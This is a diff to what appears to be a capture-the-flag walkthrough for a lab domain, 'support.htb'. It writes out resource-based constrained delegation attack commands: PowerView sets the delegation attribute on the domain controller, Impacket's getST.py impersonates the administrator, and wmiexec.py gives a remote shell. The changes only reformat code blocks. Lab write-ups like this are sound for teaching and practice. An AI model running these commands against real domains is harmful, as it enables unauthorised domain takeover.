@@ -316,17 +316,22 @@ Get-DomainComputer dc| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofother
 ```
 Get-DomainComputer dc -Properties 'msds-allowedtoactonbehalfofotheridentity'
 ```
+#result 
+
+```
 msds-allowedtoactonbehalfofotheridentity
 ----------------------------------------
 {1, 0, 4, 128...}
-
+```
+```
 Get the kerbers ticket
+```
 ```
 getST.py -dc-ip 10.10.11.174 -spn www/dc.support.htb -impersonate administrator 'support.htb/user911:password@1'
 ```
 exporting env and connect to dc as administrator
 ```
-KRB5CCNAME=administrator.ccache
+export KRB5CCNAME=administrator.ccache
 
 wmiexec.py -k -no-pass administrator@dc.support.htb
 ```
